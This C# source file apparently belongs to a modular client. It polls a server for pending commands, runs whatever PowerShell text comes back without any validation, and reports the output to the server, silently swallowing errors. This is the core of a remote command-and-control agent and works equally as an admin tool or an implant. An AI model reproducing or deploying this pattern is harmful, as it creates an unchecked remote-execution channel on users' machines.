using Client.Modules.PowerShell.Model;
using Microsoft.Extensions.Options;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http.Json;
using System.Runtime.Versioning;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;

namespace Client.Modules.PowerShell.Service
{
    public class CommandListenerService
    {
        [SupportedOSPlatform("windows")]
        public async Task CheckAndExecuteAsync(HttpClient client, CancellationToken stoppingToken)
        {
            try
            {
                if (!client.DefaultRequestHeaders.Contains("ClientId"))
                {
                    client.DefaultRequestHeaders.Add("ClientId", Environment.MachineName);
                }

                HttpResponseMessage response = await client.GetAsync("api/commands/get-pending", stoppingToken);

                if (response.IsSuccessStatusCode)
                {
                    string jsonResponse = await response.Content.ReadAsStringAsync();

                    if (!string.IsNullOrWhiteSpace(jsonResponse) && jsonResponse != "null")
                    {
                        var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
                        var commandObj = JsonSerializer.Deserialize<CommandModel>(jsonResponse, options);

                        if (commandObj != null && !string.IsNullOrEmpty(commandObj.CommandText))
                        {
                            string executionResult = ExecutePowerShell(commandObj.CommandText);

                            var resultPayload = new { Result = executionResult };
                            await client.PostAsJsonAsync("api/commands/report-result", resultPayload, stoppingToken);
                        }
                    }
                }
            }
            catch 
            {
                
            }
        }

        [SupportedOSPlatform("windows")]
        private string ExecutePowerShell(string command)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -Command \"{command}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = false
                };

                using var process = Process.Start(startInfo);
                if (process == null) return "Failed to start process.";

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(error))
                {
                    return $"Error: {error}";
                }

                return string.IsNullOrWhiteSpace(output) ? "Executed successfully (no output)." : output;
            }
            catch (Exception ex)
            {
                return "";
            }
        }
    }
}
